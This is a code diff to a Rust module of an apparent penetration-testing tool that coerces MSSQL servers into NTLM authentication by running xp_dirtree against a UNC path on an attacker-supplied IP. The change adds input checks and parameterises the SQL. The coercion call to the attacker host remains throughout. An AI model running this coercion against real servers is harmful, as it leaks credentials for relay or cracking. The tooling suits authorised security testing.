@@ -63,6 +63,11 @@ impl NxcModule for MssqlUnc {
         let attacker_ip = opts.get("UNC_IP").ok_or_else(|| anyhow!("UNC_IP is required"))?;
         let share = opts.get("SHARE").map(std::string::String::as_str).unwrap_or("share");
 
+        if attacker_ip.contains('\'') || attacker_ip.contains('\\') || attacker_ip.contains(';') ||
+           share.contains('\'') || share.contains('\\') || share.contains(';') {
+            return Err(anyhow!("Invalid UNC_IP or SHARE: contains illegal characters"));
+        }
+
         info!("Starting MSSQL NTLM Coercion against {} to {}", mssql_sess.target, attacker_ip);
 
         let mut output = String::from("MSSQL UNC Coercion Results:\n");
@@ -72,11 +77,12 @@ impl NxcModule for MssqlUnc {
         let unc_path = format!("\\\\{attacker_ip}\\{share}");
 
         // We use xp_dirtree to trigger the authentication
-        let sql = format!("EXEC master..xp_dirtree '{unc_path}', 1, 1;");
+        // Now using query_json_with_params instead of string concatenation
+        let sql = "EXEC master..xp_dirtree @P1, 1, 1;";
 
-        output.push_str(&format!("  [*] Executing: {sql}\n"));
+        output.push_str(&format!("  [*] Executing: {sql} with '{unc_path}'\n"));
 
-        if protocol.query_json(mssql_sess, &sql).await.is_ok() {
+        if protocol.query_json_with_params(mssql_sess, sql, &[&unc_path]).await.is_ok() {
             // Even if it returns no data or an error due to invalid path, the auth usually triggers
             coerced = true;
             output.push_str("  [+] xp_dirtree command executed!\n");
